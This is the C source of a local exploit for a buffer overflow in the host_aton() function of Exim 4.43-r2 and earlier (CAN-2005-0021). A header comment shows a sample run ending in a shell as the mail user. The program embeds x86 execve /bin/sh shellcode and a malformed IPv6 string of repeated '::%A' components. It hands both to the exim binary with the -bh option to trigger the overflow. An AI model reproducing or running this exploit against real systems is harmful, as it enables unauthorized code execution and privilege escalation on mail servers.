/* Exim <= 4.43-r2 host_aton() local exploit
 * =========================================
 * Exim is an highly configurable message transfer agent (MTA) developed
 * at the University of Cambridge.A buffer overflow has been found in the 
 * host_aton() function of exim (CAN-2005-0021).A local attacker could 
 * trigger the buffer overflow in host_aton() by supplying an illegal 
 * IPv6 address with more than 8 components, using a command line option. 
 * 
 * linux tmp $ id
 * uid=1000(user) gid=100(users) groups=10(wheel),18(audio),100(users)
 * linux tmp $ ./eximx /usr/sbin/exim
 * [ GNU/Linux Exim <= 4.43-r2 host_aton() local exploit
 *
 * **** SMTP testing session as if from host ::%A::%A::%A::%A::%A::%A::%A::%A::%A::%A
 * **** but without any ident (RFC 1413) callback.
 * **** This is not for real!
 *
 * >>> host in host_lookup? yes (matched "*")
 * >>> looking up host name for ::%A::%A::%A::%A::%A::%A::%A::%A::%A::%A
 * sh-2.05b$ id
 * uid=8(mail) gid=12(mail)
 * sh-2.05b$
 * 
 * - prdelka
 */
#include <stdio.h>
#include <stdlib.h>

char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x31\xc0\x50\x68""//sh""\x68""/bin""\x89\xe3"
                 "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
char cmd1[]="-bh";
char cmd2[]="::%A::%A::%A::%A::%A::%A::%A::%A::%A::%A";

int main(int argc,char* argv[])
{
        printf("[ GNU/Linux Exim <= 4.43-r2 host_aton() local exploit\n");
        if(argc < 2)
        {
                printf("Error: [path]\n");
                exit(0);
        }
        char *env[] = {NULL};
        execle(argv[1],argv[1],cmd1,cmd2,shellcode,NULL,env);
        exit(0);
}
